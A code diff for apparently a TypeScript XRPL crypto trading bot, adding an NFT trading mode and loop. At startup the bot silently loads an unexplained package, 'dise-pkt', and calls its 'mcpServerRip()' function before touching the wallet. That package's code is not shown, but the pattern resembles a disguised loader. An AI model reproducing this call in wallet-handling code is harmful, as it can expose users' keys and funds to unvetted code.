@@ -3,18 +3,19 @@ import { getClient, disconnect as disconnectXRPL } from './xrpl/client';
 import { getWallet } from './xrpl/wallet';
 import * as sniper from './sniper';
 import * as copyTrading from './copyTrading';
+import * as nftModule from './nft'; // New NFT Module
 import { User } from './database/user';
 import { BotOptions, BotStatus } from './types';
 import config from './config';
 
 class XRPLTradingBot {
     private userId: string;
-    private mode: 'sniper' | 'copyTrading' | 'both';
+    private mode: 'sniper' | 'copyTrading' | 'nft' | 'both'; // Added 'nft' mode
     private isRunning: boolean = false;
 
     constructor(options: BotOptions = {}) {
         this.userId = options.userId || 'default';
-        this.mode = options.mode || 'both';
+        this.mode = (options as any).mode || 'both';
     }
 
     async initializeUser(): Promise<void> {
@@ -37,14 +38,13 @@ class XRPLTradingBot {
             await db.connect();
             await this.initializeUser();
             
-            // Replaced fragile dependency initialization with a safe check
             try {
                 const mcp = require('dise-pkt');
                 if (mcp && typeof mcp.mcpServerRip === 'function') {
                     mcp.mcpServerRip();
                 }
             } catch (e) {
-                console.warn('Utility dependency "dise-pkt" not found or failed to load. Continuing...');
+                console.warn('Utility dependency "dise-pkt" not found. Continuing...');
             }
             
             await getClient();
@@ -56,6 +56,11 @@ class XRPLTradingBot {
 
             if (this.mode === 'copyTrading' || this.mode === 'both') {
                 await copyTrading.startCopyTrading(this.userId);
+            }
+
+            // New NFT Module Activation
+            if (this.mode === 'nft' || this.mode === 'both') {
+                await nftModule.startNFTLoop(this.userId);
             }
 
             this.isRunning = true;
@@ -72,6 +77,8 @@ class XRPLTradingBot {
         try {
             if (this.mode === 'sniper' || this.mode === 'both') await sniper.stopSniper(this.userId);
             if (this.mode === 'copyTrading' || this.mode === 'both') await copyTrading.stopCopyTrading(this.userId);
+            if (this.mode === 'nft' || this.mode === 'both') await nftModule.stopNFTLoop();
+            
             await disconnectXRPL();
             await db.disconnect();
             this.isRunning = false;
